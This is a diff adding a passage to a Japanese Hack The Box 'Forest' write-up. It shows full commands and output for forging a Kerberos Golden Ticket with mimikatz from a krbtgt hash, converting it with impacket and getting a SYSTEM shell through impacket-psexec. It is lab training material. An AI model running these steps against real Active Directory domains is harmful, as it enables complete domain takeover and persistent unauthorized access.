@@ -284,5 +284,127 @@ htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
 
 これは`secretsdump.py`の出力にある。
 
+以上の情報をもとにmimikatzでGolden Ticketを作る：
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\mimikatz.exe "kerberos::golden /user:eviluser /domain:htb.local /sid:S-1-5-21-3072663084-364016917-1341370565 /krbtgt:819af826bb148e603acb0f33d17632f8 /ptt" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # kerberos::golden /user:eviluser /domain:htb.local /sid:S-1-5-21-3072663084-364016917-1341370565 /krbtgt:819af826bb148e603acb0f33d17632f8 /ptt
+User      : eviluser
+Domain    : htb.local (HTB)
+SID       : S-1-5-21-3072663084-364016917-1341370565
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 819af826bb148e603acb0f33d17632f8 - rc4_hmac_nt
+Lifetime  : 10/14/2022 5:08:24 AM ; 10/11/2032 5:08:24 AM ; 10/11/2032 5:08:24 AM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'eviluser @ htb.local' successfully submitted for current session
+
+mimikatz(commandline) # exit
+Bye!
+```
+作成されたチケットが現在のセッションに読み込まれたことを確認：
+```
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> klist
+
+Current LogonId is 0:0x1aa7d1
+
+Cached Tickets: (1)
+
+#0>	Client: eviluser @ htb.local
+	Server: krbtgt/htb.local @ htb.local
+	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+	Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+	Start Time: 10/14/2022 5:08:24 (local)
+	End Time:   10/11/2032 5:08:24 (local)
+	Renew Time: 10/11/2032 5:08:24 (local)
+	Session Key Type: RSADSI RC4-HMAC(NT)
+	Cache Flags: 0x1 -> PRIMARY
+	Kdc Called:
+```
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-DomainComputer | select name
+
+name
+----
+FOREST
+EXCH01
+```
+あとはPsExecでシェルをとる：
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\PsExec.exe /accepteula \\FOREST cmd.exe
+```
+
+がしかし、何度やってもハングする。
+
+## Kali上でGolden Ticketを使ってシェルをとる
+
+Golden Ticket作成のコマンド`kerberos::golden`にて、`/ptt`の代わりに`/ticket`と指定する。
+
+これにより、チケットがメモリに読み込まれずにファイル（ticket.kirbi）として出力される。
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
 
 
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/14/2022   4:24 AM        1355680 mimikatz.exe
+-a----       10/14/2022   3:19 AM         770279 PowerView.ps1
+-a----       10/14/2022   4:10 AM         834936 PsExec.exe
+-a----       10/14/2022   5:15 AM           1345 ticket.kirbi
+```
+
+ticket.kirbiをKali（というか攻撃者端末）に送る。
+
+それをccacheファイルに変換して環境変数KRB5CCNAMEを設定する：
+```
+┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
+└─$ impacket-ticketConverter ticket.kirbi golden.ccache             
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] converting kirbi to ccache...
+[+] done
+
+┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
+└─$ export KRB5CCNAME=golden.ccache
+```
+
+Kali上でimpacketのpsexecを実行してシェルをとる：
+
+```
+┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
+└─$ impacket-psexec -dc-ip 10.10.10.161 -target-ip 10.10.10.161 -k -no-pass htb.local/eviluser@FOREST.htb.local   
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file MnPvZBJk.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service JcLM on 10.10.10.161.....
+[*] Starting service JcLM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
